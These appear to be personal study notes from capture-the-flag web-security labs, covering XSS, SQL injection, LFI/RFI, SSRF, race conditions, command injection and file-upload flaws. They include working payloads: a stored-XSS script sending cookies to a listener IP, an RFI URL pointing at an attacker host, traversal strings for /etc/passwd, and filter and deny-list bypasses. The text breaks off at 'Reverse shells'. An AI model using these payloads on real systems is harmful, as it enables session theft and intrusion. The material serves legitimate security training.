<span style="color:rgb(255, 255, 0)">XSS Injection</span>
**Replace the alert(THM) in the Main code with whatever XSS type, switch the IP Address with the attackbox IP Address and make sure to use the same port to listen using (nc -nlvp 9001)

Main code:
    `````
    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
    
Stored XSS code (for support tickets and admin review):
```
    <script>fetch('http://10.49.96.188:9001?cookie=' + btoa(document.cookie) );</script>
```

XFS:`<iframe src="javascript:alert(`xss`)">_`

<span style="color:rgb(255, 255, 0)">SQL Injection</span>
sqlmap: tool used for sql injection
    `--wizard`: guides with each step by asking questions
    `--dbs`: extract databases names 
    `-D database_name --tables`: extract information about tables of that db
    `-D database_name -T table_name --dump`:enumerate records from a table
    `--cookie="SESSIONID=abcdef123456"`: when testing if a website is vulnerable to sql injection attack when the url doesnt look like: /search?cat=1. we use the -u flag to test for web pages with a URL that uses GET parameter like the example /search?cat=1
- sqlmap -r intercepted_request.txt: POST-based testing used in login forms, intercept the post request and paste it into a txt file


<span style="color:rgb(255, 255, 0)">Content discovery</span>:
- <span style="color:rgb(232, 150, 150)">common directories like:</span>
    /robots.txt : restrics what search engine crawlers can look at
    /sitemap.xml : every file that the owner wishes to be listed on a search engine

- <span style="color:rgb(232, 150, 150)">curl</span>: command-line tool for transferring data to or from a server using various network protocols, we can use it with the url of the website + /images/favicon.ico | md5sum to see what framework the favicon belongs to in
 (https://wiki.owasp.org/index.php/OWASP_favicon_database) and then exploit it.
 (also using curl url and adding -v shows http header details)
 
   <span style="color:rgb(243, 88, 88)">Authentication bypass</span> example:
   `curl 'http://10.112.134.214/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`
    (-H adds content to the http header)

- <span style="color:rgb(232, 150, 150)">Google dorking</span>: (site: / inurl: / intitle: / filetype:)
- <span style="color:rgb(232, 150, 150)">Wappalyzer</span>: browser extension and tool that shows what technologies, frameworks, and more that a website uses
- <span style="color:rgb(232, 150, 150)">Wayback machine</span>: shows all times the service scraped a website and saved the contents
- <span style="color:rgb(232, 150, 150)">S3 Buckets</span>: http(s)://{name}.s3.amazonaws.com


<span style="color:rgb(255, 255, 0)">IDOR</span>:
- like changing a URL value: ?user_id=1300 to ?user_id=1000 (can be hidden inside inspector -> network menu aswell)

<span style="color:rgb(255, 255, 0)">LFI</span>:
- The process of retrieving or uploading files into a web server that might appear in the url of the web page
- <span style="color:rgb(146, 208, 80)">Path traversal (directory traversal)</span>: allows an attacker to read operating system resources such as local files on the server running an application, vulnerability happens if user input is passed to file_get_contents function in php. Attack can be used by adding `../../../etc/passwd` to the url (because we start at /var/www/app and we wanna go up to /)
    For windows: `http://webapp.thm/get.php?file=../../../../boot.ini`
    Or: `http://webapp.thm/get.php?file=../../../../windows/win.ini`

- <span style="color:rgb(146, 208, 80)">LFI:</span> we look at php functions like include, require, include_once, require_once to calculate how many ../ do i have to put in the URL, because the code could have extra directories embedded inside the function like 
  `include("languages/". $_GET['lang']);` in this case there is languages/ so we do ../ 4 times instead of 3 to reach /etc/passwd
    - if the include function automatically adds an extension to the input like `/etc/passwd.php` we can bypass this by adding to our input `%00` (null byte the terminates a string), this only works below PHP 5.3.4 (sometimes it only works in the url)
    - we can bypass filters (if /etc/passwd is filtered) by adding /. to the end because it stays in the same directory unlike /.. 
    - if `../` is filtered we bypass by using `....//....//....//etc/passwd`
    - `/../../proc/self/cmdline`: to identify the running processes and the absolute path of the web application (app.py)

- <span style="color:rgb(146, 208, 80)">RFI</span>: allows an attacker to inject an external URL into the include function, one requirement is that the `allow_url_fopen` option needs to be on
    `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
    we can do RFI by starting python3 -m http.server 9000 on a tab and input in the form `http:<ip>:port/file.txt` (works with shell too)


<span style="color:rgb(255, 255, 0)">SSRF</span>:
- (Server-side Request Forgery), cause the server-side application to make requests to a destination of the attacker's choosing, can be regular or blind.
- Confirming Blind SSRF: through requestbin.com / burp collaborator / python3 listener
- Examples:
     <span style="color:rgb(146, 208, 80)">Full URL in a paramater:</span> `https://website.thm/item/2?server=api` directs to `https://server.website.thm/api/item?id=2`, so replacing the value in server= changes destination. 
     `server=server.website.thm/flag?id=9&x=` ---> `https://server.website.thm/flag?id=9&x=/api/item?id=2`, adding &x= at the end causes whatever the application appends to be useless
    
     <span style="color:rgb(146, 208, 80)">Partial URL (Hostname or Path only):</span> Some application accept only hostname or path segment and construct the rest of the URL on the server side: `https://website.thm/stock?server=api.internal` can become --> `https://website.thm/stock?server=attacker.com`
     
     <span style="color:rgb(146, 208, 80)"> Path Traversal:</span> directory traversal sequences. `https://website.thm/stock?url=/item/123/details`. An attacker can supply (/../admin) causing the server to request: `https://website.thm/admin`
     
     <span style="color:rgb(146, 208, 80)">Hidden form fields:</span> Not all SSRF is in URL, `<input type="hidden" name="avatar" value="/images/avatars/default.png">`: Image path is stored in a hidden field, attacker can modify using browser developer tools or burp suite

     **Defeating SSRF Defences:**
     - Deny list: if there is input validation on "localhost" or "127.0.0.1": replace with "127.0.0.1.nip.io" or "2130706433"  (Cloud applications would block the ip address 169.254.169.254)
     - If url cant start with `/private` because its denied, we can replace with `x/../private` which turns to `/private` 


<span style="color:rgb(255, 255, 0)">Race conditions:</span> Abuse features like applying coupons or money transfer in a vulnerabe website using Burp Suite (if a challenge requires an account to reach 100$ for example through transfers)
     <span style="color:rgb(146, 208, 80)">Example</span>:
     1- Right click a successful money transfer POST request in burp suite and sent to repeater,
     2- In the repeater tab, click on the + icon and create "New tab group"
     3- Name the group, then select the request you just sent in "Add tabs to group", then create group
     4- Right click on the request tab and choose "Duplicate Tab" (or CTRL+R) for example 20 times
     5- Next to the send button, click the arrow and choose how to send the duplicated requests
     

<span style="color:rgb(255, 255, 0)">Command Injection: </span>attacker manipulates input fields to inject malicious commands. many languages provide built-in functions that allow application code to execute commands directly on the underlying OS like (They can be exploited if there is no input validation): 
     PHP: `exec()` / `system()` / `shell_exec()` / `passthru()`           Python: `subprocess`            Node.js: `chill_process.exec()`
     ![[Pasted image 20260713000239.png]] (dont forget the ; before any input)
     
Detecting blind command injection (no output on screen):
- payloads with observable delay: `; ping -c 10 127.0.0.1` or commands like `timeout` in windows
- forcing output into a file: `; whoami > /var/www/html/output.txt` then navigate to `http://target.thm/output.txt`
- curl with the payload: `curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami`, the last part is URL encoded and its equivalent to (?search=The Beatles; whoami)

**More payloads and info about command injection:** https://github.com/payload-box/command-injection-payload-list#payload-files


<span style="color:rgb(255, 255, 0)">Upload Vulnerability:</span>
- <span style="color:rgb(146, 208, 80)">Overwriting existing files</span>: In the source code if there is `<img src="images/khaled.jpg">`, sometimes we can rename an image to `khaled.jpg` and upload it to overwrite the shown image

- <span style="color:rgb(146, 208, 80)">RCE: </span>
    - Web shells: use gobuster to find where uploaded files go, (/uploads or /resources or etc..), then upload the suitable shell. 
    Example webshell:
    ![[Pasted image 20260715211017.png]]

    - Reverse shells: